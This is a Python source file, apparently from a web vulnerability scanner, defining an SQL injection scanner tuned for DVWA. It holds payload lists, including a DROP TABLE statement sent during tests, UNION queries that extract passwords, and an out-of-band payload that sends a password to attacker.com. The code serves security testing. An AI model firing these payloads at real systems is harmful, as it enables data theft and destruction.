import asyncio
import re
from typing import Dict, List, Any, Set, Tuple, Optional
import urllib.parse
import time
import json

from core.base_scanner import BaseScanner
from core.models import (
    HttpRequest, 
    HttpResponse, 
    VulnerabilityType, 
    VulnerabilitySeverity,
    Vulnerability
)


class SQLInjectionScanner(BaseScanner):
    """
    SQL Injection vulnerability scanner.
    
    Scanner ini mendeteksi berbagai tipe kerentanan SQL injection dengan:
    1. Testing parameter dengan SQL injection payloads
    2. Mendeteksi pesan error database dalam response
    3. Testing untuk time-based blind SQL injection
    4. Testing untuk boolean-based blind SQL injection
    5. Testing untuk UNION-based SQL injection
    6. Testing untuk stacked queries
    7. Testing untuk Out-of-band SQL injection
    """
    
    def __init__(self):
        super().__init__()
        self.name = "SQLInjectionScanner"
        self.description = "Mendeteksi kerentanan SQL injection"
        self._last_request_time = 0
        self.headers = {}
        self.cookies = {}
        self.session_cookies = {}
        self._request_count = 0
        self._start_time = 0
        self._rate_limit = {
            "requests_per_second": 10,  # Batas request per detik
            "max_concurrent": 5,        # Batas request bersamaan
            "cooldown_threshold": 50,   # Jumlah request sebelum cooldown
            "cooldown_time": 2,         # Waktu cooldown dalam detik
            "adaptive": True            # Gunakan rate limiting adaptif
        }
        self._semaphore = None  # Akan diinisialisasi di setup()
        
        # SQL error patterns untuk berbagai database
        self.sql_errors = {
            # MySQL
            "mysql": [
                r"SQL syntax.*?MySQL",
                r"Warning.*?mysql_",
                r"MySQL Query fail.*?",
                r"SQL syntax.*?MariaDB server",
                r"You have an error in your SQL syntax",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"MySQL Query fail.*?",
                r"mysqli_sql_exception",  # DVWA specific
                r"The used SELECT statements have a different number of columns",  # DVWA specific
                r"Uncaught mysqli_sql_exception",  # DVWA specific
            ],
            # PostgreSQL
            "postgresql": [
                r"PostgreSQL.*?ERROR",
                r"Warning.*?\Wpg_",
                r"Error.*?PostgreSQL",
                r"valid PostgreSQL result",
                r"Npgsql\.",
            ],
            # MS SQL Server
            "mssql": [
                r"Driver.*? SQL[\-\_\ ]*Server",
                r"OLE DB.*? SQL Server",
                r"\bSQL Server.*?Error",
                r"\bSQL Server.*?Driver",
                r"Unclosed quotation mark after the character string",
                r"Incorrect syntax near",
                r"Microsoft SQL Native Client.*?",
            ],
            # Oracle 
            "oracle": [
                r"\bORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Oracle.*?Driver",
                r"Warning.*?\Woci_",
                r"Warning.*?\Wora_",
                r"Oracle.*?Driver",
            ],
            # SQLite
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r".*SQLITE_ERROR",
                r"WARNING: Unexpected character in input: '\"' ASCII=34",
            ],
            # Generic
            "generic": [
                r"SQL (syntax|command|statement).*?error",
                r"Syntax error.*?in query expression",
                r"Unexpected (end of SQL|token \".*?\")",
                r"database driver.*?database error.*?",
                r"Unknown column '.*?' in 'field list'",
                r"Fatal error.*?mysqli_sql_exception",  # DVWA specific
                r"Stack trace.*?mysqli_query",  # DVWA specific
            ],
        }
        
        # Combine all patterns
        self.error_patterns = []
        for db_type, patterns in self.sql_errors.items():
            for pattern in patterns:
                self.error_patterns.append(re.compile(pattern, re.IGNORECASE))
                
        # Basic SQL injection payloads
        self.test_payloads = [
            "' OR '1'='1",  # Basic payload
            "' OR '1'='1' -- ",  # Comment out the rest
            "\" OR \"1\"=\"1",  # Double quote variant
            "\" OR \"1\"=\"1\" -- ",  # Double quote with comment
            "') OR ('1'='1",  # Closing parenthesis
            "\") OR (\"1\"=\"1",  # Double quote with closing parenthesis
            "' OR '1'='1' /*",  # Block comment
            "'; DROP TABLE users; --",  # Multiple statements
            "1' OR '1' = '1",  # Numeric field
            "1\" OR \"1\" = \"1",  # Numeric field with double quotes
            "1' UNION SELECT NULL,NULL,NULL-- ",  # DVWA specific
            "1' UNION SELECT NULL,NULL-- ",  # DVWA specific
            "1' UNION SELECT NULL-- ",  # DVWA specific
            "1' UNION SELECT user(),database(),version()-- ",  # DVWA specific
            "1' AND 1=1 UNION SELECT user,password FROM users-- ",  # DVWA specific
        ]
        
        # UNION-based payloads
        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "') UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "') UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version--",
            "' UNION ALL SELECT CONCAT(table_name,'::',column_name) FROM information_schema.columns--",
        ]
        
        # Stacked queries payloads
        self.stacked_queries = [
            "; SELECT SLEEP(5)--",
            "); SELECT SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "'); SELECT SLEEP(5)--",
            "; SELECT pg_sleep(5)--",
            "); SELECT pg_sleep(5)--",
            "; WAITFOR DELAY '0:0:5'--",
            "); WAITFOR DELAY '0:0:5'--",
        ]
        
        # Out-of-band payloads
        self.oob_payloads = [
            "'; LOAD_FILE(CONCAT('\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\'))--",
            "'; SELECT ... INTO OUTFILE '/var/www/html/output.txt'--",
            "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",
            "';DECLARE @h VARCHAR(8000);SELECT @h=0x73656c65637420404076657273696f6e;EXEC(@h)--",
        ]
        
        # Time-based blind payloads
        self.time_payloads = {
            "mysql": [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
                "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
                "') AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
                "\") AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            ],
            "postgresql": [
                "' AND (SELECT pg_sleep(5)) -- ",
                "\" AND (SELECT pg_sleep(5)) -- ",
                "') AND (SELECT pg_sleep(5)) -- ",
                "\") AND (SELECT pg_sleep(5)) -- ",
            ],
            "mssql": [
                "' WAITFOR DELAY '0:0:5' -- ",
                "\" WAITFOR DELAY '0:0:5' -- ",
                "') WAITFOR DELAY '0:0:5' -- ",
                "\") WAITFOR DELAY '0:0:5' -- ",
            ],
            "oracle": [
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(97)||CHR(114),5) -- ",
                "\" AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(97)||CHR(114),5) -- ",
                "') AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(97)||CHR(114),5) -- ",
                "\") AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(97)||CHR(114),5) -- ",
            ],
        }
        
        # Boolean-based blind payloads
        self.boolean_payloads = [
            ("' AND 1=1 -- ", "' AND 1=2 -- "),  # True and false conditions
            ("\" AND 1=1 -- ", "\" AND 1=2 -- "),  # Double quote variant
            ("') AND 1=1 -- ", "') AND 1=2 -- "),  # With closing parenthesis
            ("\") AND 1=1 -- ", "\") AND 1=2 -- "),  # Double quote with closing parenthesis
            ("' OR 1=1 -- ", "' AND 1=2 -- "),  # OR and AND conditions
            ("\" OR 1=1 -- ", "\" AND 1=2 -- "),  # Double quote variant
        ]

    async def setup(self, options):
        """
        Setup scanner dengan opsi yang diberikan
        """
        await super().setup(options)
        
        # Extract cookies from options if available
        if hasattr(options, 'custom_parameters') and options.custom_parameters:
            custom_params = options.custom_parameters
            if isinstance(custom_params, dict):
                if 'cookies' in custom_params:
                    self._setup_cookies(custom_params['cookies'])
                    
                # Set headers if provided
                if 'headers' in custom_params:
                    self.headers = custom_params['headers']
                    
                # Set rate limit options
                if 'rate_limit' in custom_params:
                    self._rate_limit.update(custom_params['rate_limit'])
        
        # Initialize semaphore for concurrent requests
        self._semaphore = asyncio.Semaphore(self._rate_limit["max_concurrent"])
        self._start_time = time.time()
        
        return self

    def _setup_cookies(self, cookies_str):
        """
        Setup cookies dari string atau dictionary
        """
        if not cookies_str:
            return
            
        if isinstance(cookies_str, str):
            # Parse cookie string (format: "name1=value1; name2=value2")
            cookie_pairs = cookies_str.split(';')
            for pair in cookie_pairs:
                if '=' in pair:
                    name, value = pair.strip().split('=', 1)
                    self.cookies[name] = value
        elif isinstance(cookies_str, dict):
            # Use dictionary directly
            self.cookies.update(cookies_str)
            
        # Update headers with cookies
        if self.cookies:
            cookie_header = "; ".join([f"{name}={value}" for name, value in self.cookies.items()])
            if 'Cookie' in self.headers:
                self.headers['Cookie'] = f"{self.headers['Cookie']}; {cookie_header}"
            else:
                self.headers['Cookie'] = cookie_header

    async def _login_session(self, login_url, username, password, username_field="username", password_field="password"):
        """
        Login to create a session for authenticated testing
        """
        form_data = {
            username_field: username,
            password_field: password,
            "Login": "Login"  # Common submit button name
        }
        
        # Send login request
        request, response = await self.send_request(login_url, method="POST", data=form_data)
        
        # Extract session cookies
        if 'Set-Cookie' in response.headers:
            cookies = response.headers['Set-Cookie']
            self._setup_cookies(cookies)
            
        return response.status_code == 200 or response.status_code == 302

    async def _rate_limited_request(self, url: str, **kwargs) -> Tuple[HttpRequest, HttpResponse]:
        """
        Implementasi rate limiting untuk mencegah overload server
        """
        # Pastikan semaphore sudah diinisialisasi
        if self._semaphore is None:
            self._semaphore = asyncio.Semaphore(self._rate_limit["max_concurrent"])
            
        # Gunakan semaphore untuk membatasi request bersamaan
        async with self._semaphore:
            # Hitung waktu sejak request terakhir
            if hasattr(self, "_last_request_time"):
                elapsed = time.time() - self._last_request_time
                
                # Terapkan rate limiting dasar
                min_delay = 1.0 / self._rate_limit["requests_per_second"]
                if elapsed < min_delay:
                    await asyncio.sleep(min_delay - elapsed)
                
                # Terapkan cooldown jika diperlukan
                self._request_count += 1
                if self._rate_limit["adaptive"] and self._request_count % self._rate_limit["cooldown_threshold"] == 0:
                    self.logger.debug(f"Rate limiting cooldown after {self._request_count} requests")
                    await asyncio.sleep(self._rate_limit["cooldown_time"])
                    
                    # Hitung dan sesuaikan rate limit berdasarkan respons server
                    avg_time = (time.time() - self._start_time) / self._request_count
                    if avg_time < 0.1:  # Server merespons sangat cepat
                        self._rate_limit["requests_per_second"] = min(20, self._rate_limit["requests_per_second"] * 1.2)
                    elif avg_time > 1.0:  # Server merespons lambat
                        self._rate_limit["requests_per_second"] = max(1, self._rate_limit["requests_per_second"] * 0.8)
            
            # Add cookies and headers to request
            if self.headers and 'headers' not in kwargs:
                kwargs['headers'] = self.headers
            elif self.headers and 'headers' in kwargs:
                # Merge headers, prioritizing passed headers
                merged_headers = self.headers.copy()
                merged_headers.update(kwargs['headers'])
                kwargs['headers'] = merged_headers
                
            # Lakukan request
            try:
                request, response = await self.send_request(url, **kwargs)
                self._last_request_time = time.time()
                
                # Update session cookies if any are returned
                if 'Set-Cookie' in response.headers:
                    self._update_session_cookies(response.headers['Set-Cookie'])
                
                return request, response
            except Exception as e:
                self.logger.error(f"Error during rate-limited request to {url}: {str(e)}")
                raise
                
    async def _parallel_requests(self, requests: List[Dict[str, Any]]) -> List[Tuple[HttpRequest, HttpResponse]]:
        """
        Lakukan beberapa request secara paralel dengan rate limiting
        
        Args:
            requests: List dictionary dengan parameter request (url, method, data, dll)
            
        Returns:
            List tuple (HttpRequest, HttpResponse)
        """
        async def _do_request(req_params):
            url = req_params.pop("url")
            method = req_params.pop("method", "GET")
            return await self._safe_request(url, method=method, **req_params)
            
        # Buat tasks untuk semua request
        tasks = []
        for req in requests:
            tasks.append(_do_request(req.copy()))
            
        # Jalankan semua request dan tunggu hasilnya
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter hasil yang error
        valid_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                self.logger.error(f"Error in parallel request {i}: {str(result)}")
            else:
                valid_results.append(result)
                
        return valid_results
        
    def _update_session_cookies(self, cookies_header):
        """
        Update session cookies from response headers
        """
        if not cookies_header:
            return
            
        # Parse Set-Cookie header
        cookie_parts = cookies_header.split(',')
        for part in cookie_parts:
            # Handle multiple cookies separated by commas
            for cookie in part.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    # Store only actual cookies, not attributes like Path, Expires, etc.
                    if not name.lower() in ['path', 'expires', 'domain', 'secure', 'httponly', 'samesite']:
                        self.session_cookies[name] = value
                        self.cookies[name] = value
                        
        # Update Cookie header
        if self.session_cookies:
            cookie_str = "; ".join([f"{name}={value}" for name, value in self.session_cookies.items()])
            self.headers['Cookie'] = cookie_str

    async def _validate_injection(self, url: str, param_name: str, payload: str, original_response: HttpResponse) -> bool:
        """
        Validate if a SQL injection payload was successful
        """
        # Create test URL with payload
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        query_params[param_name] = [payload]
        
        # Ensure Submit parameter exists
        if "Submit" not in query_params:
            query_params["Submit"] = ["Submit"]
        
        # Rebuild URL with payload
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        # Send request with payload
        _, response = await self._rate_limited_request(test_url)
        
        # Check for SQL errors
        if self._contains_sql_error(response.body):
            return True
            
        # Check for time-based injection
        if len(response.body) > len(original_response.body) * 2:
            return True
            
        # Check for boolean-based injection
        if response.body != original_response.body:
            return True
            
        return False

    async def _safe_request(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, 
                          headers: Optional[Dict[str, str]] = None, timeout: int = 10) -> Tuple[Optional[HttpRequest], Optional[HttpResponse]]:
        """
        Lakukan request dengan penanganan error yang lebih baik
        
        Args:
            url: URL target
            method: Metode HTTP
            data: Data untuk request
            headers: Header untuk request
            timeout: Timeout dalam detik
            
        Returns:
            Tuple (HttpRequest, HttpResponse) atau (None, None) jika terjadi error
        """
        try:
            # Tambahkan timeout ke kwargs
            kwargs = {'timeout': timeout}
            
            # Tambahkan data jika ada
            if data:
                kwargs['data'] = data
                
            # Tambahkan headers jika ada
            if headers:
                kwargs['headers'] = headers
                
            # Lakukan request
            request, response = await self._rate_limited_request(url, method=method, **kwargs)
            return request, response
            
        except asyncio.TimeoutError:
            self.logger.warning(f"Request timeout for URL: {url}")
            # Timeout bisa jadi indikasi time-based injection berhasil
            return None, None
            
        except Exception as e:
            self.logger.error(f"Error during request to {url}: {str(e)}")
            return None, None
            
    async def scan(self, target_url: str) -> List[Vulnerability]:
        """
        Scan target URL untuk SQL injection vulnerabilities
        """
        vulnerabilities = []
        
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Pastikan parameter Submit=Submit selalu ada
            if "Submit" not in query_params:
                query_params["Submit"] = ["Submit"]
                
            # Rebuild URL with Submit parameter
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Get original response for comparison
            request, original_response = await self._safe_request(target_url)
            
            if not original_response:
                self.logger.error(f"Failed to get original response for {target_url}")
                return vulnerabilities
            
            # Extract parameters from URL
            params = {}
            for param_name, param_values in query_params.items():
                params[param_name] = param_values
                
            # Test each parameter
            for param_name, param_values in params.items():
                if param_name != "Submit":  # Skip Submit parameter
                    for param_value in param_values:
                        try:
                            param_vulns = await self._test_parameter(target_url, param_name, param_value)
                            vulnerabilities.extend(param_vulns)
                        except Exception as e:
                            self.logger.error(f"Error testing parameter {param_name}: {str(e)}")
                            import traceback
                            self.logger.debug(traceback.format_exc())
            
        except Exception as e:
            self.logger.error(f"Error scanning {target_url}: {str(e)}")
            import traceback
            self.logger.debug(traceback.format_exc())
        
        return vulnerabilities
        
    async def _test_parameters(self, url: str, params: Dict[str, List[str]]) -> None:
        """
        Test parameters for SQL injection vulnerabilities
        """
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Merge existing parameters with new ones
        for param_name, param_values in params.items():
            if param_name in query_params:
                query_params[param_name].extend(param_values)
            else:
                query_params[param_name] = param_values
                
        # Ensure Submit parameter exists
        if "Submit" not in query_params:
            query_params["Submit"] = ["Submit"]
            
        # Rebuild URL with all parameters
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        # Get original response for comparison
        request, original_response = await self._rate_limited_request(test_url)
        
        # Test each parameter
        for param_name, param_values in params.items():
            if param_name != "Submit":  # Skip Submit parameter
                for param_value in param_values:
                    await self._test_parameter(test_url, param_name, param_value)
    
    async def _test_form(self, form: Dict[str, Any], base_url: str) -> None:
        """
        Test form inputs for SQL injection vulnerabilities.
        
        Args:
            form: Form data
            base_url: Base URL of the page containing the form
        """
        form_action = form.get('action', '')
        form_method = form.get('method', 'GET')
        inputs = form.get('inputs', [])
        
        self.logger.debug(f"Testing form with action {form_action} and method {form_method}")
        
        if not inputs:
            return
        
        # Create a baseline form submission with original values
        form_data = {}
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            if field_name:
                form_data[field_name] = field_value
        
        # Test each input field
        tasks = []
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            field_type = input_field.get('type', 'text')
            
            # Skip hidden, checkbox, radio, etc.
            if field_type not in ['text', 'search', 'url', 'tel', 'email', 'password']:
                continue
            
            # Create tasks for parallel testing
            if form_method.upper() == 'GET':
                target_url = form_action or base_url
                tasks.append(self._test_error_based(target_url, field_name, field_value, method='GET', form_data=form_data.copy()))
                tasks.append(self._test_time_based(target_url, field_name, field_value, method='GET', form_data=form_data.copy()))
                tasks.append(self._test_boolean_based(target_url, field_name, field_value, method='GET', form_data=form_data.copy()))
            else:  # POST
                target_url = form_action or base_url
                tasks.append(self._test_error_based(target_url, field_name, field_value, method='POST', form_data=form_data.copy()))
                tasks.append(self._test_time_based(target_url, field_name, field_value, method='POST', form_data=form_data.copy()))
                tasks.append(self._test_boolean_based(target_url, field_name, field_value, method='POST', form_data=form_data.copy()))
        
        # Run all tests in parallel
        await asyncio.gather(*tasks)
    
    async def _test_error_based(self, url: str, param_name: str, param_value: str, 
                               method: str = 'GET', form_data: Optional[Dict[str, str]] = None) -> None:
        """
        Test for error-based SQL injection.
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            param_value: Original parameter value
            method: HTTP method
            form_data: Form data for POST requests
        """
        for payload in self.test_payloads:
            # Skip time-based payloads
            if 'SLEEP' in payload or 'DELAY' in payload or 'pg_sleep' in payload:
                continue
            
            # Prepare request data
            test_data = {} if form_data is None else form_data.copy()
            test_data[param_name] = payload
            
            # Send request
            try:
                if method == 'GET':
                    # Build URL with parameters
                    parsed_url = urllib.parse.urlparse(url)
                    query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                    query_dict.update(test_data)
                    
                    # Reconstruct URL
                    new_query = urllib.parse.urlencode(query_dict)
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme, 
                        parsed_url.netloc, 
                        parsed_url.path, 
                        parsed_url.params, 
                        new_query, 
                        parsed_url.fragment
                    ))
                    
                    request, response = await self.send_request(new_url, method='GET')
                else:  # POST
                    request, response = await self.send_request(url, method='POST', data=test_data)
                
                # Check for SQL errors in response
                if response.body and self._contains_sql_error(response.body):
                    # Determine the database type
                    db_type = self._identify_database(response.body or "")
                    
                    # Add vulnerability
                    self.add_vulnerability(
                        name="SQL Injection",
                        description=f"SQL injection vulnerability detected in parameter {param_name} with payload: {payload}",
                        vuln_type=VulnerabilityType.SQL_INJECTION,
                        severity=VulnerabilitySeverity.HIGH,
                        request=request,
                        response=response,
                        evidence=self._extract_error_evidence(response.body or ""),
                        payload=payload,
                        cwe_id=89,  # CWE-89: SQL Injection
                        remediation="Use prepared statements and parameterized queries. Never build SQL queries by concatenating user input."
                    )
                    
                    # Log the finding
                    self.logger.info(f"SQL injection detected in {param_name} at {url} (Error-based, {db_type})")
                    
                    # No need to test more payloads for this parameter
                    return
                    
            except Exception as e:
                self.logger.error(f"Error testing {param_name} with payload {payload}: {str(e)}")
    
    async def _test_time_based(self, url: str, param_name: str, param_value: str,
                              method: str = 'GET', form_data: Optional[Dict[str, str]] = None) -> None:
        """
        Test for time-based SQL injection.
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            param_value: Original parameter value
            method: HTTP method
            form_data: Form data for POST requests
        """
        # Konfigurasi delay yang digunakan dalam payload
        base_delay = 2  # Delay dasar dalam detik
        
        # Lakukan pengukuran baseline response time terlebih dahulu
        baseline_times = []
        for _ in range(3):  # Ambil 3 sampel untuk baseline
            start_time = time.time()
            if method == 'GET':
                await self.send_request(url)
            else:
                await self.send_request(url, method='POST', data=form_data)
            elapsed = time.time() - start_time
            baseline_times.append(elapsed)
        
        # Hitung rata-rata dan standar deviasi waktu respons baseline
        avg_baseline = sum(baseline_times) / len(baseline_times)
        std_dev = (sum((x - avg_baseline) ** 2 for x in baseline_times) / len(baseline_times)) ** 0.5
        
        # Tentukan threshold untuk deteksi (rata-rata + 3 * standar deviasi + delay)
        threshold = avg_baseline + 3 * std_dev + base_delay
        
        # Log baseline information
        self.logger.debug(f"Time-based baseline for {url}: avg={avg_baseline:.3f}s, std_dev={std_dev:.3f}s, threshold={threshold:.3f}s")
        
        # Test dengan payload untuk berbagai database
        for db_type, payloads in self.time_payloads.items():
            for payload in payloads:
                # Ekstrak nilai delay dari payload
                delay_match = re.search(r'SLEEP\((\d+)\)', payload) or re.search(r'pg_sleep\((\d+)\)', payload) or re.search(r"DELAY '0:0:(\d+)'", payload)
                expected_delay = int(delay_match.group(1)) if delay_match else base_delay
                
                # Sesuaikan payload untuk delay yang lebih pendek jika diperlukan
                if expected_delay > base_delay:
                    payload = payload.replace(f"SLEEP({expected_delay})", f"SLEEP({base_delay})")
                    payload = payload.replace(f"pg_sleep({expected_delay})", f"pg_sleep({base_delay})")
                    payload = payload.replace(f"DELAY '0:0:{expected_delay}'", f"DELAY '0:0:{base_delay}'")
                
                # Prepare request data
                test_data = {} if form_data is None else form_data.copy()
                test_data[param_name] = payload
                
                # Send request and measure time
                try:
                    start_time = time.time()
                    if method == 'GET':
                        # Build URL with parameters
                        parsed_url = urllib.parse.urlparse(url)
                        query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                        query_dict.update(test_data)
                        
                        # Reconstruct URL
                        new_query = urllib.parse.urlencode(query_dict)
                        new_url = urllib.parse.urlunparse((
                            parsed_url.scheme, 
                            parsed_url.netloc, 
                            parsed_url.path, 
                            parsed_url.params, 
                            new_query, 
                            parsed_url.fragment
                        ))
                        
                        request, response = await self.send_request(new_url, method='GET')
                    else:  # POST
                        request, response = await self.send_request(url, method='POST', data=test_data)
                    
                    elapsed_time = time.time() - start_time
                    
                    # Deteksi time-based injection dengan threshold yang adaptif
                    if elapsed_time >= threshold:
                        # Verifikasi dengan satu tes tambahan untuk mengurangi false positive
                        start_time = time.time()
                        if method == 'GET':
                            await self.send_request(new_url, method='GET')
                        else:
                            await self.send_request(url, method='POST', data=test_data)
                        verification_time = time.time() - start_time
                        
                        # Jika kedua tes menunjukkan delay yang signifikan, konfirmasi sebagai kerentanan
                        if verification_time >= threshold:
                            # Add vulnerability
                            self.add_vulnerability(
                                name="Time-based SQL Injection",
                                description=f"Time-based SQL injection vulnerability detected in parameter {param_name}",
                                vuln_type=VulnerabilityType.SQL_INJECTION,
                                severity=VulnerabilitySeverity.HIGH,
                                request=request,
                                response=response,
                                evidence=f"Response delayed by {elapsed_time:.2f}s (baseline: {avg_baseline:.2f}s)",
                                payload=payload,
                                cwe_id=89,  # CWE-89: SQL Injection
                                remediation="Use prepared statements and parameterized queries. Never build SQL queries by concatenating user input."
                            )
                            
                            # Log the finding
                            self.logger.info(f"Time-based SQL injection detected in {param_name} at {url} ({db_type})")
                            
                            # No need to test more payloads for this parameter
                            return
                        
                except Exception as e:
                    self.logger.error(f"Error testing {param_name} with payload {payload}: {str(e)}")
                    
        # Jika tidak ada kerentanan yang ditemukan, coba dengan payload yang lebih agresif
        # untuk database yang tidak terdeteksi dengan payload standar
        aggressive_payloads = [
            f"' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) x JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) y JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) z) > 0 AND SLEEP({base_delay}) -- ",
            f"' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) x JOIN (SELECT 1 UNION SELECT 2) y JOIN (SELECT 1 UNION SELECT 2) z JOIN (SELECT 1 UNION SELECT 2) a JOIN (SELECT 1 UNION SELECT 2) b) > 0 AND SLEEP({base_delay}) -- ",
            f"' AND (SELECT pg_sleep({base_delay})) -- ",
            f"'; WAITFOR DELAY '0:0:{base_delay}' -- "
        ]
        
        for payload in aggressive_payloads:
            # Prepare request data
            test_data = {} if form_data is None else form_data.copy()
            test_data[param_name] = payload
            
            # Send request and measure time
            try:
                start_time = time.time()
                if method == 'GET':
                    # Build URL with parameters
                    parsed_url = urllib.parse.urlparse(url)
                    query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                    query_dict.update(test_data)
                    
                    # Reconstruct URL
                    new_query = urllib.parse.urlencode(query_dict)
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme, 
                        parsed_url.netloc, 
                        parsed_url.path, 
                        parsed_url.params, 
                        new_query, 
                        parsed_url.fragment
                    ))
                    
                    request, response = await self.send_request(new_url, method='GET')
                else:  # POST
                    request, response = await self.send_request(url, method='POST', data=test_data)
                
                elapsed_time = time.time() - start_time
                
                # Deteksi time-based injection dengan threshold yang adaptif
                if elapsed_time >= threshold:
                    # Add vulnerability
                    self.add_vulnerability(
                        name="Time-based SQL Injection",
                        description=f"Time-based SQL injection vulnerability detected in parameter {param_name}",
                        vuln_type=VulnerabilityType.SQL_INJECTION,
                        severity=VulnerabilitySeverity.HIGH,
                        request=request,
                        response=response,
                        evidence=f"Response delayed by {elapsed_time:.2f}s (baseline: {avg_baseline:.2f}s)",
                        payload=payload,
                        cwe_id=89,  # CWE-89: SQL Injection
                        remediation="Use prepared statements and parameterized queries. Never build SQL queries by concatenating user input."
                    )
                    
                    # Log the finding
                    self.logger.info(f"Time-based SQL injection detected in {param_name} at {url} (aggressive payload)")
                    
                    # No need to test more payloads for this parameter
                    return
                    
            except Exception as e:
                self.logger.error(f"Error testing {param_name} with aggressive payload {payload}: {str(e)}")
    
    async def _test_boolean_based(self, url: str, param_name: str, param_value: str,
                                 method: str = 'GET', form_data: Optional[Dict[str, str]] = None) -> None:
        """
        Test for boolean-based blind SQL injection.
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            param_value: Original parameter value
            method: HTTP method
            form_data: Form data for POST requests
        """
        for true_payload, false_payload in self.boolean_payloads:
            # Prepare request data for TRUE condition
            true_data = {} if form_data is None else form_data.copy()
            true_data[param_name] = true_payload
            
            # Prepare request data for FALSE condition
            false_data = {} if form_data is None else form_data.copy()
            false_data[param_name] = false_payload
            
            try:
                # Send TRUE condition request
                if method == 'GET':
                    # Build URL with parameters for TRUE condition
                    parsed_url = urllib.parse.urlparse(url)
                    query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                    query_dict.update(true_data)
                    
                    # Reconstruct URL
                    true_query = urllib.parse.urlencode(query_dict)
                    true_url = urllib.parse.urlunparse((
                        parsed_url.scheme, 
                        parsed_url.netloc, 
                        parsed_url.path, 
                        parsed_url.params, 
                        true_query, 
                        parsed_url.fragment
                    ))
                    
                    true_request, true_response = await self.send_request(true_url, method='GET')
                    
                    # Build URL with parameters for FALSE condition
                    query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                    query_dict.update(false_data)
                    
                    # Reconstruct URL
                    false_query = urllib.parse.urlencode(query_dict)
                    false_url = urllib.parse.urlunparse((
                        parsed_url.scheme, 
                        parsed_url.netloc, 
                        parsed_url.path, 
                        parsed_url.params, 
                        false_query, 
                        parsed_url.fragment
                    ))
                    
                    false_request, false_response = await self.send_request(false_url, method='GET')
                    
                else:  # POST
                    true_request, true_response = await self.send_request(url, method='POST', data=true_data)
                    false_request, false_response = await self.send_request(url, method='POST', data=false_data)
                
                # Compare responses
                if self._is_boolean_injection_detected(true_response, false_response):
                    self.add_vulnerability(
                        name="Boolean-Based Blind SQL Injection",
                        description=f"Boolean-based blind SQL injection vulnerability detected in parameter {param_name}",
                        vuln_type=VulnerabilityType.SQL_INJECTION,
                        severity=VulnerabilitySeverity.HIGH,
                        request=true_request,
                        response=true_response,
                        evidence="Different responses for TRUE and FALSE conditions",
                        payload=f"TRUE: {true_payload}, FALSE: {false_payload}",
                        cwe_id=89,  # CWE-89: SQL Injection
                        remediation="Use prepared statements and parameterized queries. Never build SQL queries by concatenating user input."
                    )
                    
                    # Log the finding
                    self.logger.info(f"Boolean-based SQL injection detected in {param_name} at {url}")
                    
                    # No need to test more payloads for this parameter
                    return
                    
            except Exception as e:
                self.logger.error(f"Error testing {param_name} with payloads {true_payload}/{false_payload}: {str(e)}")
    
    def _contains_sql_error(self, response_body: str) -> bool:
        """
        Check if response contains SQL error messages
        """
        if not response_body:
            return False
            
        # Deteksi format respons
        try:
            # Coba parse sebagai JSON
